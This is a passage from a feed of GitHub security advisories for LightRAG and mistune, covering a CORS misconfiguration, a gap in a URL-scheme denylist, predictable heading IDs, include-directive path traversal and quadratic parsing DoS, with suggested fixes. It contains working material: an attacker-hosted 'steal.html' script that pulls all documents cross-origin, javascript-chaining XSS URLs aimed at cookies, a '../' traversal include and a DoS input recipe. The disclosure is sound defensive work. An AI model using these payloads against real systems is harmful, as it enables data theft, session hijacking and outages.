<p>The server defaults to CORS_ORIGINS=* combined with allow_credentials=True. Starlette's CORSMiddleware echoes the requesting origin in preflight responses when credentials are enabled, meaning every origin is effectively whitelisted for credentialed cross-origin requests. Any malicious website can perform authenticated API calls on behalf of a logged-in user.</p>
<h3 id="details">Details</h3>
<pre><code class="language-python"># lightrag/api/config.py:639
args.cors_origins = get_env_value("CORS_ORIGINS", "*")  # default wildcard

# lightrag/api/lightrag_server.py:1379
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],       # any origin
    allow_credentials=True,   # credentials — PROBLEM with wildcard
    allow_methods=["*"],
    allow_headers=["*"],
)

# Starlette CORSMiddleware (confirmed in source):
# preflight_explicit_allow_origin = not allow_all_origins or allow_credentials
# = not True or True = True  → echoes the requesting origin back, not "*"
# Result: every origin receives Access-Control-Allow-Credentials: true
</code></pre>
<h3 id="poc">PoC</h3>
<p>Host on any origin. Open in browser where user is logged in to LightRAG:</p>
<pre><code class="language-html">&lt;!-- attacker.com/steal.html --&gt;
&lt;script&gt;
const TARGET = "http://lightrag-server:9621";
(async () =&gt; {
  // Get victim token (or re-use existing session)
  const r1 = await fetch(`${TARGET}/login`, {
    method: "POST", credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: "username=victim&amp;password=known_pass"
  });
  const { access_token } = await r1.json();

  // Exfiltrate all documents
  const docs = await (await fetch(`${TARGET}/documents`, {
    credentials: "include",
    headers: { Authorization: `Bearer ${access_token}` }
  })).json();
  console.log("STOLEN DOCS:", docs);
})();
&lt;/script&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>Permissive cross-domain policy (CWE-942). Any website visited by an authenticated LightRAG user can silently make authenticated API requests, exfiltrating all documents and knowledge graph data or performing destructive actions such as deleting the entire document store.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HKUDS/LightRAG/security/advisories/GHSA-6x6h-qqr7-855w">https://github.com/HKUDS/LightRAG/security/advisories/GHSA-6x6h-qqr7-855w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61736">https://nvd.nist.gov/vuln/detail/CVE-2026-61736</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/pull/3317">https://github.com/HKUDS/LightRAG/pull/3317</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/commit/09567a4c983f580050db63569dd477122c058c3d">https://github.com/HKUDS/LightRAG/commit/09567a4c983f580050db63569dd477122c058c3d</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/commit/df68d75f9dc29dd340ffb6794b48f48c4fdc9a2d">https://github.com/HKUDS/LightRAG/commit/df68d75f9dc29dd340ffb6794b48f48c4fdc9a2d</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/commit/ebba6548639c0f2e8919100eff76b401f1222252">https://github.com/HKUDS/LightRAG/commit/ebba6548639c0f2e8919100eff76b401f1222252</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4">https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-6x6h-qqr7-855w">https://github.com/advisories/GHSA-6x6h-qqr7-855w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6x6h-qqr7-855w</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-20T21:45:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune renderers/html.safe_url: HARMFUL_PROTOCOLS list misses legacy and chained schemes that historically chain to `javascript:` execution]]></title>
        <id>https://github.com/advisories/GHSA-qfrw-5rxm-mhh2</id>
        <link href="https://github.com/advisories/GHSA-qfrw-5rxm-mhh2"/>
        <updated>2026-07-20T21:35:33.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> URL-scheme allowlist gap. The <code>safe_url</code> filter only blocks the four schemes <code>javascript:</code>, <code>vbscript:</code>, <code>file:</code>, <code>data:</code>. Several other schemes are accepted into rendered <code>&lt;a href="..."&gt;</code> and <code>&lt;img src="..."&gt;</code> tags despite being known XSS vectors in legacy or chain-handling browsers. The same gap applies to direct links, reference links, and autolinks.
<strong>File:</strong> <code>src/mistune/renderers/html.py</code>, line 11-23 (HARMFUL_PROTOCOLS list).
<strong>Root cause:</strong> the HARMFUL_PROTOCOLS tuple is a hardcoded, opt-out denylist of four entries. Browsers historically supported (and some still partially support) several other schemes that either execute JavaScript directly (<code>livescript:</code>, <code>mocha:</code>) or wrap a <code>javascript:</code> payload (<code>feed:javascript:</code>, <code>view-source:javascript:</code>, <code>jar:javascript:</code>, <code>ms-its:javascript:</code>, <code>mk:@MSITStore:javascript:</code>). On user-agents that still recognise these schemes (older Firefox builds for <code>feed:</code>/<code>jar:</code>, all Internet Explorer / Edge Legacy for <code>ms-its:</code>/<code>mk:</code>/<code>res:</code>, niche chrome-style browsers, browser extensions that register custom protocol handlers), clicking a link rendered by mistune executes attacker-controlled JavaScript in the page's origin.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/mistune/renderers/html.py</code>, lines 10-62.</p>
<pre><code class="language-python">class HTMLRenderer(BaseRenderer):
    HARMFUL_PROTOCOLS: ClassVar[Tuple[str, ...]] = (
        "javascript:",
        "vbscript:",
        "file:",
        "data:",
    )                                                         # &lt;-- BUG: incomplete denylist
    GOOD_DATA_PROTOCOLS: ClassVar[Tuple[str, ...]] = (
        "data:image/gif;",
        "data:image/png;",
        "data:image/jpeg;",
        "data:image/webp;",
    )

    def safe_url(self, url: str) -&gt; str:
        if self._allow_harmful_protocols is True:
            return escape_text(url)
        _url = url.lower()
        if self._allow_harmful_protocols and _url.startswith(tuple(self._allow_harmful_protocols)):
            return escape_text(url)
        if _url.startswith(self.HARMFUL_PROTOCOLS) and not _url.startswith(self.GOOD_DATA_PROTOCOLS):
            return "#harmful-link"
        return escape_text(url)                               # &lt;-- BUG: any scheme not in HARMFUL_PROTOCOLS passes through
</code></pre>
<p><strong>Why it's wrong:</strong> an opt-out denylist for URL schemes is the wrong shape. The set of schemes a user-agent might honour is unbounded (registered handlers, browser extensions, OS-level protocol registrations, custom intent handlers on Android, etc.), but the set of schemes a markdown renderer needs to allow is small (<code>http://</code>, <code>https://</code>, <code>mailto:</code>, optionally <code>tel:</code>, <code>ftp:</code>, fragment-only <code>#anchor</code>, and a few image-only <code>data:</code> types). Switching to an opt-in allowlist with a <code>safe_extra_protocols</code> knob for callers who need others would close every variant of this bug class permanently. The current code accepts every chained-scheme XSS vector for as long as the project remembers to keep the denylist current.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Application accepts attacker-supplied markdown and renders it with mistune. The default <code>escape=True</code> prevents raw HTML, but link href/image src filtering is the only XSS defense for <code>[click](...)</code> and <code>![alt](...)</code> syntax.</li>
<li>Attacker writes <code>[click here](feed:javascript:alert(document.cookie))</code>. mistune's <code>safe_url</code> checks <code>feed:javascript:alert(document.cookie)</code> against <code>HARMFUL_PROTOCOLS = ('javascript:', 'vbscript:', 'file:', 'data:')</code> — none match. The href is escape_text'd (HTML-entity escape) and emitted as <code>&lt;a href="feed:javascript:alert(document.cookie)"&gt;click here&lt;/a&gt;</code>.</li>
<li>Victim using a Firefox build that still has the feed handler registered (extension, configuration, or LTS that retained the feed reader past the 64.0 removal — including some forks and ESR builds) clicks the link. Firefox's feed handler invokes the inner URL, which is <code>javascript:alert(...)</code>. JS executes in the page's origin. Victim's session cookie is exfiltrated.</li>
<li>Same pattern for <code>livescript:alert(1)</code> (Netscape Communicator era, still recognised by some niche browsers / browser-emulator tools), <code>view-source:javascript:alert(1)</code> (Firefox, see CVE-2009-1938), <code>jar:javascript:alert(1)</code> (older Firefox), <code>ms-its:javascript:</code> (IE/Edge Legacy), <code>res:javascript:</code> (IE), <code>mk:@MSITStore:javascript:</code> (IE CHM viewer). Each user-agent that recognises one of these is exploitable; the user-agent population that recognises at least one is not negligible (corporate environments still running Edge Legacy compatibility mode, locked-down kiosk browsers, Android WebView in apps that register custom intent handlers, Linux distros with old Firefox ESR plus the <code>feed:</code> extension, etc.).</li>
</ol>
<p>The same primitive applies to image src (<code>![](feed:javascript:...)</code> rendered as <code>&lt;img src="feed:..."&gt;</code>) — though most browsers don't fetch javascript: from img src, the same chained handler quirk applies on a few user-agents — and to reference links and autolinks (verified in the PoC below; the rendered HTML is identical regardless of which markdown link syntax is used).</p>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-moderate. Conditional XSS depending on user-agent. Modern Chrome / Edge Chromium / Safari ignore most of these schemes, but Firefox forks, Edge Legacy, in-app WebViews, browser extensions registering custom handlers, and corporate browser deployments are exposed. Defence-in-depth is the framing: a markdown renderer should not need to track which browsers still honour which legacy chained-scheme.
<strong>Attacker capability:</strong> plant a link in any place the application renders user-supplied markdown. When clicked by a user-agent that honours the legacy scheme, the attacker's JavaScript runs in the page's origin (steal cookies, perform actions as the victim, etc.).
<strong>Preconditions:</strong> application uses mistune to render attacker-influenced markdown. Default config. Victim user-agent is one of the affected populations. No specific mistune option is required.
<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>, default config. The following inputs all PASS the filter and reach the rendered HTML unchanged:</p>
<pre><code class="language-python">import mistune
md = mistune.create_markdown()
for url in [
    'feed:javascript:alert(1)',                  # Firefox feed handler chain
    'livescript:alert(1)',                       # Netscape, niche browsers
    'mocha:alert(1)',                            # Netscape, niche browsers
    'view-source:javascript:alert(1)',           # Firefox view-source chain (CVE-2009-1938 class)
    'jar:javascript:alert(1)',                   # Firefox jar: handler chain
    'ms-its:javascript:alert(1)',                # IE/Edge Legacy InfoTech Storage handler
    'mk:@MSITStore:javascript:alert(1)',         # IE CHM viewer chain
    'res:javascript:',                           # IE resource: handler
]:
    print(md(f'[click]({url})').strip())

# Output (each one passes the filter):
#   &lt;p&gt;&lt;a href="feed:javascript:alert(1)"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="livescript:alert(1)"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="mocha:alert(1)"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="view-source:javascript:alert(1)"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="jar:javascript:alert(1)"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="ms-its:javascript:alert(1)"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="mk:@MSITStore:javascript:"&gt;click&lt;/a&gt;&lt;/p&gt;
#   &lt;p&gt;&lt;a href="res:javascript:"&gt;click&lt;/a&gt;&lt;/p&gt;
</code></pre>
<p>For comparison, the four schemes already in the denylist are correctly blocked: <code>javascript:</code>, <code>vbscript:</code>, <code>file:</code>, <code>data:text/html</code> all return <code>&lt;a href="#harmful-link"&gt;</code>.</p>
<p>The same gap applies to reference links (<code>[click][ref]\n\n[ref]: feed:javascript:alert(1)</code> → <code>&lt;a href="feed:javascript:alert(1)"&gt;</code>) and to autolinks (<code>&lt;feed:javascript:alert(1)&gt;</code> → <code>&lt;a href="feed:javascript:alert(1)"&gt;</code>).</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Switch from denylist to allowlist. The set of schemes a markdown renderer needs to allow is small and well-known; the set of schemes that might trigger handler chains is unbounded.</p>
<pre><code class="language-diff">--- a/src/mistune/renderers/html.py
+++ b/src/mistune/renderers/html.py
@@ -7,21 +7,28 @@ class HTMLRenderer(BaseRenderer):

     _escape: bool
     NAME: ClassVar[Literal["html"]] = "html"
-    HARMFUL_PROTOCOLS: ClassVar[Tuple[str, ...]] = (
-        "javascript:",
-        "vbscript:",
-        "file:",
-        "data:",
-    )
+    SAFE_PROTOCOLS: ClassVar[Tuple[str, ...]] = (
+        "http:",
+        "https:",
+        "mailto:",
+        "tel:",
+        "ftp:",
+        "ftps:",
+        "irc:",
+        "ircs:",
+    )
     GOOD_DATA_PROTOCOLS: ClassVar[Tuple[str, ...]] = (
         "data:image/gif;",
         "data:image/png;",
         "data:image/jpeg;",
         "data:image/webp;",
     )

@@ -49,15 +56,21 @@ class HTMLRenderer(BaseRenderer):
     def safe_url(self, url: str) -&gt; str:
-        if self._allow_harmful_protocols is True:
-            return escape_text(url)
-
-        _url = url.lower()
-        if self._allow_harmful_protocols and _url.startswith(tuple(self._allow_harmful_protocols)):
-            return escape_text(url)
-
-        if _url.startswith(self.HARMFUL_PROTOCOLS) and not _url.startswith(self.GOOD_DATA_PROTOCOLS):
-            return "#harmful-link"
-        return escape_text(url)
+        # Allow-list: only schemes in SAFE_PROTOCOLS, image-only data: URLs in
+        # GOOD_DATA_PROTOCOLS, scheme-relative URLs (//host/path), absolute
+        # paths (/path), and anchor-only references (#fragment) reach the
+        # rendered output. Everything else is replaced with '#harmful-link'.
+        if self._allow_harmful_protocols is True:
+            return escape_text(url)
+        _url = url.lower().lstrip()
+        if (
+            _url.startswith(self.SAFE_PROTOCOLS)
+            or _url.startswith(self.GOOD_DATA_PROTOCOLS)
+            or _url.startswith(("/", "#", "?"))
+            or ":" not in _url.split("/", 1)[0]   # bare relative path
+        ):
+            return escape_text(url)
+        if self._allow_harmful_protocols and _url.startswith(tuple(self._allow_harmful_protocols)):
+            return escape_text(url)
+        return "#harmful-link"
</code></pre>
<p>The <code>allow_harmful_protocols</code> option is preserved, so callers who genuinely want to allow a custom scheme can still opt in. The <code>lower().lstrip()</code> also closes the leading-whitespace evasion sub-case (e.g., <code> javascript:</code> is already blocked by the current code via <code>lower().startswith</code>, but the same pattern needs to apply on the new allowlist branch). Add regression tests for each scheme listed in the PoC above asserting they resolve to <code>#harmful-link</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-qfrw-5rxm-mhh2">https://github.com/lepture/mistune/security/advisories/GHSA-qfrw-5rxm-mhh2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59929">https://nvd.nist.gov/vuln/detail/CVE-2026-59929</a></li>
<li><a href="https://github.com/lepture/mistune/commit/c7101fcbb6e8790e8e39157c5ca2238fc6dd6cbc">https://github.com/lepture/mistune/commit/c7101fcbb6e8790e8e39157c5ca2238fc6dd6cbc</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2217.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2217.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-qfrw-5rxm-mhh2">https://github.com/advisories/GHSA-qfrw-5rxm-mhh2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qfrw-5rxm-mhh2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T21:35:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune toc / TableOfContents directive: heading IDs use predictable `toc_N` numbering with no slugification, allowing collision with attacker-controlled `id="toc_N"` content]]></title>
        <id>https://github.com/advisories/GHSA-2hm2-hc3v-44h9</id>
        <link href="https://github.com/advisories/GHSA-2hm2-hc3v-44h9"/>
        <updated>2026-07-20T21:35:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Predictable identifier generation. The <code>toc</code> plugin and <code>TableOfContents</code> directive both default to generating heading IDs of the form <code>toc_1</code>, <code>toc_2</code>, <code>toc_3</code>, ... with no input-derived component. An attacker who can place a heading anywhere in the document can predict which <code>toc_N</code> ID it will receive, and can inject HTML elsewhere (in a non-heading context) that uses the same <code>id="toc_N"</code> to either (a) shadow the legitimate heading anchor, breaking same-page navigation, or (b) collide with CSS or JavaScript that targets <code>#toc_N</code> selectors, redirecting click handlers and styling to attacker-chosen content.
<strong>File:</strong> <code>src/mistune/toc.py</code> line 36-37 (<code>heading_id = lambda token, index: "toc_" + str(index + 1)</code>); <code>src/mistune/directives/toc.py</code> line 33 (same default).
<strong>Root cause:</strong> the default <code>heading_id</code> callback ignores the heading's text content and uses only the headings's order in the document. Two documents rendered together (or one document with attacker-influenced headings spliced into trusted content) produce overlapping <code>toc_N</code> IDs. Because <code>id</code> attribute uniqueness is required by HTML, browsers behaviour on duplicate IDs is undefined; <code>document.getElementById('toc_1')</code> returns the first match, <code>getElementsByTagName + querySelector</code> semantics differ across paths, and CSS rules targeting <code>#toc_1</code> apply to whichever element matches first in tree order.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/mistune/toc.py</code>, lines 33-39.</p>
<pre><code class="language-python">def add_toc_hook(md, min_level=1, max_level=3, heading_id=None):
    if heading_id is None:
        def heading_id(token, index):
            return "toc_" + str(index + 1)               # &lt;-- BUG: index-only ID, no slug derived from heading text
</code></pre>
<p><strong>File:</strong> <code>src/mistune/directives/toc.py</code>, lines 32-33.</p>
<pre><code class="language-python">class TableOfContents(DirectivePlugin):
    def __init__(self, min_level=1, max_level=3):
        # ...

    def generate_heading_id(self, token, index):
        return "toc_" + str(index + 1)                   # &lt;-- BUG: same predictable scheme
</code></pre>
<p><strong>Why it's wrong:</strong> the standard markdown-engine convention (used by GitHub-flavoured Markdown, Sphinx, MkDocs, pandoc, every modern markdown renderer in production) is to slugify the heading TEXT for the ID — <code>&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;</code> — with a numeric suffix appended only when slug collisions occur. mistune's default punts the slugification entirely and produces purely positional IDs that an attacker can predict in O(1).</p>
<p>The downstream impacts:</p>
<ul>
<li>Same-page links with <code>[click](#toc_1)</code> go to whichever element with <code>id="toc_1"</code> appears first in tree order. If the attacker can land any HTML element with <code>id="toc_1"</code> before the real heading (via inline_html with <code>escape=False</code>, via the include-directive HTML branch, via attacker-supplied content earlier in the document), navigation is hijacked.</li>
<li>CSS rules targeting <code>#toc_1</code> apply to the wrong element.</li>
<li>JavaScript bound to <code>document.getElementById('toc_1')</code> operates on the wrong element.</li>
<li>The TOC's own <code>&lt;a href="#toc_1"&gt;</code> link in the rendered TOC list points to whichever element wins the duplicate-ID race.</li>
</ul>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Application uses mistune with <code>add_toc_hook(md)</code> or <code>TableOfContents</code> directive enabled (the documented setup for sites with TOC support).</li>
<li>Application renders an attacker-supplied document, or splices attacker content into a trusted document. With <code>escape=False</code> (or via the include-directive <code>.html</code> branch covered by my prior advisory), the attacker can place <code>&lt;a id="toc_1"&gt;...&lt;/a&gt;</code> anywhere in the document.</li>
<li>mistune assigns <code>id="toc_1"</code> to the first heading. Now there are two elements with <code>id="toc_1"</code> in the page.</li>
<li>The rendered TOC contains <code>&lt;a href="#toc_1"&gt;First heading&lt;/a&gt;</code>. Clicking it navigates to whichever element with <code>id="toc_1"</code> appears first in tree order. If the attacker placed their <code>&lt;a id="toc_1"&gt;</code> BEFORE the heading, navigation is hijacked.</li>
<li>Same-page CSS / JS / aria-described references to <code>#toc_1</code> similarly redirect.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Severity:</strong> sec-low. Not a direct XSS or RCE; the issue is identifier confusion that enables UI-redirection / navigation-hijack attacks. The realistic attacker capability is "make an internal anchor link go to attacker content instead of the real heading", or "make a CSS selector apply to attacker content", or "break aria/screen-reader associations".
<strong>Attacker capability:</strong> with the ability to plant any HTML element with <code>id="toc_N"</code> in the document, hijack <code>&lt;a href="#toc_N"&gt;</code> navigation and any CSS/JS targeting that ID. With <code>escape=False</code>, this is straightforward. With <code>escape=True</code>, the attacker needs another vector to land a raw <code>id</code> attribute (one of the include-directive branches, a sibling tooling pipeline that lets HTML through, etc.).
<strong>Preconditions:</strong> application uses TOC + the default <code>heading_id</code> callback. If the application provides its own <code>heading_id</code> (e.g., one based on slugified heading text, with collision suffixes), this finding does not apply.
<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>:</p>
<pre><code class="language-python">import mistune
from mistune.directives import RSTDirective, TableOfContents
md = mistune.create_markdown(plugins=[RSTDirective([TableOfContents()])])

print(md('''
.. toc::

# Heading 1

# Heading 2
'''))

# Output (note: id="toc_1" / id="toc_2", purely positional):
# &lt;details class="toc" open&gt;
#   &lt;summary&gt;Table of Contents&lt;/summary&gt;
#   &lt;ul&gt;
#     &lt;li&gt;&lt;a href="#toc_1"&gt;Heading 1&lt;/a&gt;&lt;/li&gt;
#     &lt;li&gt;&lt;a href="#toc_2"&gt;Heading 2&lt;/a&gt;&lt;/li&gt;
#   &lt;/ul&gt;
# &lt;/details&gt;
# &lt;h1 id="toc_1"&gt;Heading 1&lt;/h1&gt;
# &lt;h1 id="toc_2"&gt;Heading 2&lt;/h1&gt;
</code></pre>
<p>The patched build (with the suggested fix below) produces text-derived slugs like <code>id="heading-1"</code> and <code>id="heading-2"</code>, which are tied to content rather than position.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Default to slugifying the heading text:</p>
<pre><code class="language-diff">--- a/src/mistune/toc.py
+++ b/src/mistune/toc.py
@@ -33,9 +33,18 @@ def add_toc_hook(md, min_level=1, max_level=3, heading_id=None):
     if heading_id is None:
+        import re
+        _slug_re = re.compile(r"[^a-z0-9]+")
+        seen = {}
         def heading_id(token, index):
-            return "toc_" + str(index + 1)
+            text = striptags(md.renderer(md.inline(token["text"], {}), BlockState()))
+            slug = _slug_re.sub("-", text.lower()).strip("-") or "section"
+            n = seen.get(slug, 0)
+            seen[slug] = n + 1
+            return slug if n == 0 else f"{slug}-{n}"
</code></pre>
<p>Same change applies to <code>src/mistune/directives/toc.py:33</code>. Existing applications that have hardcoded <code>#toc_N</code> anchors will break; document the migration in the changelog and consider providing an opt-out flag for the legacy behaviour. Add a regression test that asserts heading IDs are slug-derived, not position-derived, and that collisions get a <code>-N</code> suffix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-2hm2-hc3v-44h9">https://github.com/lepture/mistune/security/advisories/GHSA-2hm2-hc3v-44h9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59930">https://nvd.nist.gov/vuln/detail/CVE-2026-59930</a></li>
<li><a href="https://github.com/lepture/mistune/commit/c4093c4742ed0d10d9332fb8edb455869b7b581b">https://github.com/lepture/mistune/commit/c4093c4742ed0d10d9332fb8edb455869b7b581b</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2218.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2218.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2hm2-hc3v-44h9">https://github.com/advisories/GHSA-2hm2-hc3v-44h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hm2-hc3v-44h9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T21:35:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune: Arbitrary File Read via Include directive path traversal]]></title>
        <id>https://github.com/advisories/GHSA-r4rv-85jg-w4mf</id>
        <link href="https://github.com/advisories/GHSA-r4rv-85jg-w4mf"/>
        <updated>2026-07-20T21:34:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A path traversal issue exists in mistune's <code>Include</code> directive when markdown files are processed using <code>md.read()</code>. A crafted include path can cause files outside the intended markdown directory to be accessed.</p>
<h3 id="details">Details</h3>
<p>The issue occurs in the <code>Include.parse()</code> method where user-supplied paths are joined and normalized without verifying that the resulting path remains within an expected directory.</p>
<pre><code class="language-python">relpath = self.parse_title(m)
dest = os.path.join(os.path.dirname(source_file), relpath)
dest = os.path.normpath(dest)
</code></pre>
<p>Because the final path is not restricted to a trusted base directory, path traversal sequences such as <code>../</code> may reference files outside the intended location.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>Create a markdown file:</p>
<pre><code class="language-markdown">.. include:: ../../../example.txt
</code></pre>
<p>Process it using:</p>
<pre><code class="language-python">import mistune
from mistune.directives import RSTDirective, Include

md = mistune.create_markdown(
    plugins=[RSTDirective([Include()])]
)

result, state = md.read("test.md")
print(result)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Applications that process untrusted markdown files with the <code>Include</code> directive enabled may allow unintended file access. The impact depends on how the feature is used and what files are accessible to the running process.</p>
<h3 id="recommended-fix">Recommended Fix</h3>
<p>Validate the resolved path and ensure it remains within an allowed directory before opening the file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-r4rv-85jg-w4mf">https://github.com/lepture/mistune/security/advisories/GHSA-r4rv-85jg-w4mf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59924">https://nvd.nist.gov/vuln/detail/CVE-2026-59924</a></li>
<li><a href="https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993">https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2212.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2212.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-r4rv-85jg-w4mf">https://github.com/advisories/GHSA-r4rv-85jg-w4mf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4rv-85jg-w4mf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-20T21:34:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune plugins/formatting: quadratic-time parsing on long runs of `~~x~~`, `==x==`, and `^^x^^` markers (strikethrough / mark / insert)]]></title>
        <id>https://github.com/advisories/GHSA-c8j7-8cv4-2xmq</id>
        <link href="https://github.com/advisories/GHSA-c8j7-8cv4-2xmq"/>
        <updated>2026-07-20T21:34:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><strong>Type:</strong> Algorithmic-complexity denial of service. A run of N closed pairs <code>~~x~~~~x~~...</code> (or the analogous <code>==x==</code> for <code>mark</code>, <code>^^x^^</code> for <code>insert</code>) causes O(N²) work in the formatting parser. With the <code>strikethrough</code>, <code>mark</code>, or <code>insert</code> plugin enabled, an 8 KB input pegs the CPU for ~4 seconds; 16 KB → ~17 seconds. 
<strong>File:</strong> <code>src/mistune/plugins/formatting.py</code>, lines 13-15 (the <code>_STRIKE_END</code> / <code>_MARK_END</code> / <code>_INSERT_END</code> patterns and their per-position scan).
<strong>Root cause:</strong> for each opening <code>~~</code>/<code>==</code>/<code>^^</code> the parser scans forward for the matching close pattern. The scan itself uses a bounded regex, but the parser tries the close-scan at every potential start position. For input shaped like <code>~~x~~</code> repeated N times, every <code>~~</code> is examined as a possible start, each scan covers up to the end of input. Total work is O(N²). Default config without these plugins handles the same input in linear time (4 ms for 4000 reps), confirming the cost is in the formatting plugin's per-marker scan, not in core parsing.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/mistune/plugins/formatting.py</code>, lines 12-16.</p>
<pre><code class="language-python">_STRIKE_END = re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\~|[^\s~])~~(?!~)")
_MARK_END = re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\=|[^\s=])==(?!=)")
_INSERT_END = re.compile(r"(?:" + PREVENT_BACKSLASH + r"\\\^|[^\s^])\^\^(?!\^)")
# Each pattern is scanned forward from every start position fired by the
# corresponding inline rule. The end-pattern itself is bounded; the cost
# comes from the surrounding parser invoking the scan at every '~~' / '==' / '^^'
# token in the input, giving N starts × O(N) per scan = O(N^2) total.
</code></pre>
<p><strong>Why it's wrong:</strong> the same algorithmic-complexity flaw class as <code>[</code> / <code>[a</code> parsing in core: a per-token retry loop without memoisation of failed positions. Each formatting marker is tried as both a potential start and as a continuation. A linear-pass delimiter-stack algorithm (matching how <code>commonmark-py</code> and <code>markdown-it-py</code> handle emphasis) would do this work in O(N) total. The bounded regex on each individual scan does not bound the parser-level repetition.</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Application uses mistune to render user-supplied markdown and has any of the formatting plugins enabled (<code>plugins=['strikethrough']</code>, <code>['mark']</code>, <code>['insert']</code>, or any superset). These plugins are commonly enabled because GitHub-flavoured-Markdown compatibility requires <code>~~strikethrough~~</code> and many editors emit <code>==highlighting==</code> and <code>^^underline^^</code> shortcuts.</li>
<li>Attacker submits an 8 KB markdown payload of the form <code>~~x~~~~x~~~~x~~...</code> (40 000 characters of <code>~~x~~</code> repeated 8000 times, or the analogous shape with <code>==</code> / <code>^^</code>).</li>
<li>Server calls <code>mistune.create_markdown(plugins=['strikethrough'])(payload)</code>. CPU pegs for ~4 seconds; 16 KB → ~17 seconds; 32 KB → ~70 seconds. Pure CPU cost, no significant memory growth.</li>
